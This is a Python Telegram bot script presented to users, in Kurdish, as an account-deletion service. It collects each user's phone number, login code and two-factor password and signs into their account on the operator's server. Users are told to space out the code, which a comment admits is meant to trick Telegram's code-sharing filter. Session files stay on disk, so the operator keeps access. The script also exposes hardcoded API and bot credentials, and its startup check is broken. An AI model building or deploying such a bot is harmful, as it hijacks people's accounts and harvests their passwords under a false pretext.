import asyncio
import os
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.account import DeleteAccountRequest

# --- YOUR CONFIGURATION ---
API_ID = 20907639           # Your API ID from my.telegram.org
API_HASH = 'e43600f1a902523549d0d0dc39f9f10e' # Your API Hash
BOT_TOKEN = '8255056409:AAHS6uNKyaEIEMnAobOxzrO_vrhxiNh9QNI'    # Your Bot Token from @BotFather

# Ensure sessions folder exists
if not os.path.exists('sessions'):
    os.makedirs('sessions')

bot = TelegramClient('bot_session', API_ID, API_HASH)
user_states = {}

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond(
        "⚠️ بۆتێ ژێبرنا هەژمارێ**\n\n"
        "ژمارا تەلەفۆنا خۆ دگەل کۆدێ وەلاتى بنڤيسه (e.g., `+1234567890`).",
      buttons=[Button.text("Cancel", resize=True)]
    )

@bot.on(events.NewMessage)
async def handle_messages(event):
    uid = event.sender_id
    text = event.text.strip()

    if text == "Cancel":
        if uid in user_states:
            await user_states[uid]['client'].disconnect()
            user_states.pop(uid)
        return await event.respond("Cancelled.", buttons=Button.clear())

    # 1. Start Login (Phone Number)
    if text.startswith('+') and uid not in user_states:
        client = TelegramClient(f'sessions/u_{uid}', API_ID, API_HASH)
        await client.connect()
        try:
            # We save the hash to prevent 'Expired' errors
            res = await client.send_code_request(text)
            user_states[uid] = {'client': client, 'phone': text, 'hash': res.phone_code_hash}
            await event.respond(
                "✅ کۆد هاتە هنارتن!\n\n"
                "⚠️ **Iگرنگ: ژ بۆ ئەوەی دەم بسەرڤە نەچیت، کۆدی بنێرە ب رێکا بۆشایی .\n"
                "نموونە: ەگەر کۆدێ تە 55566 بیت، 55 666 فرێکە لازم تو دةست پئكئ 2 ژمارئن دةست پئكئ چئكئ و پاشي سپةيسةكئ شني دئ 3 ژمارئن دي چئكئ نمونه 22 322."
            )
        except Exception as e:
            await event.respond(f"Error: {e}")

    # 2. Verify Login Code
    elif uid in user_states and 'hash' in user_states[uid] and 'logged_in' not in user_states[uid]:
        data = user_states[uid]
        # Remove spaces/dots user added to trick Telegram's filters
        clean_code = text.replace(" ", "").replace(".", "")
        
        try:
            await data['client'].sign_in(data['phone'], clean_code, phone_code_hash=data['hash'])
            user_states[uid]['logged_in'] = True
            await event.respond("سەركەفتن! فرێکرن /delete_now ب دوماهیک ئینان.")
        except SessionPasswordNeededError:
            user_states[uid]['awaiting_pass'] = True
            await event.respond("پەیڤا نهێنی یا 2FA یا خۆ بنڤيسه:")
        except Exception as e:
            await event.respond(f"❌ Error: {e}\nTry /start again.")

    # 3. Handle 2FA Password
    elif uid in user_states and user_states[uid].get('awaiting_pass'):
        try:
            await user_states[uid]['client'].sign_in(password=text)
            user_states[uid]['logged_in'] = True
            await event.respond("2FA OK! Send /delete_now to finish.")
        except Exception as e:
            await event.respond(f"Password Error: {e}")

@bot.on(events.NewMessage(pattern='/delete_now'))
async def finalize(event):
    uid = event.sender_id
    if uid in user_states and user_states[uid].get('logged_in'):
        try:
            await user_states[uid]['client'](DeleteAccountRequest(reason="Bye!"))
            await event.respond("Account deleted.")
        except Exception as e:
            await event.respond(f"Error: {e}")
        finally:
            await user_states[uid]['client'].disconnect()
            user_states.pop(uid, None)

# --- STARTUP FOR PYTHON 3.14 ---
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    print("Bot is LIVE.")
    await bot.run_until_disconnected()

if name == 'main':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass